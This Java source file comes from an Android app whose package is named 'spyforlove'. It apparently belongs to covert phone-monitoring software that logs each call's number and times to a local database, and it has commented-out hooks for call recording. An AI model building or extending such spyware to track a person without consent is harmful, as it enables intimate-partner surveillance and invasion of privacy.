package chem.kth.spyforlove.broadcast;

import android.content.Context;
import android.media.MediaRecorder;
import android.util.Log;

import chem.kth.spyforlove.database.DatabaseHelper;
import chem.kth.spyforlove.model.PhoneCall;

public class CallReceiver extends PhoneCallReceiver {

    private static final String TAG = "call";
    DatabaseHelper dbHelper;
    private boolean isRecordIsStarted = false;
    private MediaRecorder recorder;

    public CallReceiver() {
        dbHelper = DatabaseHelper.getInstance();
    }

    @Override
    protected void onIncomingCallRinging(Context context, PhoneCall phoneCall) {
        Log.d(TAG, String.format("ringing %s ph %s date ", phoneCall.getPhone(), phoneCall.getStart_date().toString()));
        long i = dbHelper.saveCall(phoneCall);
        if (i > 0) {
            Log.d(TAG, "ringing save success!");
        }
    }

    @Override
    protected void onIncomingCallStarted(Context ctx, PhoneCall phoneCall) {
        Log.d(TAG, String.format("incoming %s ph %s date ", phoneCall.getPhone(), phoneCall.getStart_date().toString()));
        long i = dbHelper.updateCallWithStartDate(phoneCall);
        if (i > 0) {
            Log.d(TAG, "incoming call save success!");
        }
//        ctx.startService(new Intent(ctx, RecorderService.class));
    }

    @Override
    protected void onIncomingCallEnded(Context ctx, PhoneCall phoneCall) {
        Log.d(TAG, String.format("end %s ph %s date ", phoneCall.getPhone(), phoneCall.getEnd_date().toString()));
        long i = dbHelper.updateCall(phoneCall);
        if (i > 0) {
            Log.d(TAG, "onIncomingCallEnded save success!");
        }
//        ctx.stopService(new Intent(ctx, RecorderService.class));
    }

    @Override
    protected void onOutgoingCallStarted(Context ctx, PhoneCall phoneCall) {
        Log.d(TAG, String.format("out %s ph %s date ", phoneCall.getPhone(), phoneCall.getStart_date().toString()));
        long i = dbHelper.saveCall(phoneCall);
        if (i > 0) {
            Log.d(TAG, "outgoing save success!");
        }
    }

    @Override
    public void onOutgoingCallAnswered(Context context, PhoneCall phoneCall) {
        Log.d(TAG, String.format("out start %s ph %s date ", phoneCall.getPhone(), phoneCall.getStart_date().toString()));
        long i = dbHelper.updateCallWithStartDate(phoneCall);
        if (i > 0) {
            Log.d(TAG, "out answer call save success!");
        }
    }

    @Override
    protected void onOutgoingCallEnded(Context ctx, PhoneCall phoneCall) {
        Log.d(TAG, String.format("out end %s ph %s date ", phoneCall.getPhone(), phoneCall.getStart_date().toString()));
        long i = dbHelper.updateCall(phoneCall);
        if (i > 0) {
            Log.d(TAG, "outgoing call save success!");
        }
    }

    @Override
    protected void onMissedCall(Context ctx, PhoneCall phoneCall) {
        Log.d(TAG, String.format("miss %s ph %s date ", phoneCall.getPhone(), phoneCall.getStart_date().toString()));
        Log.d(TAG, "onMissedCall: " + phoneCall.getCallType().name());
        long i = dbHelper.updateCall(phoneCall);
        if (i > 0) {
            Log.d(TAG, "missed call save success!");
        }
    }
}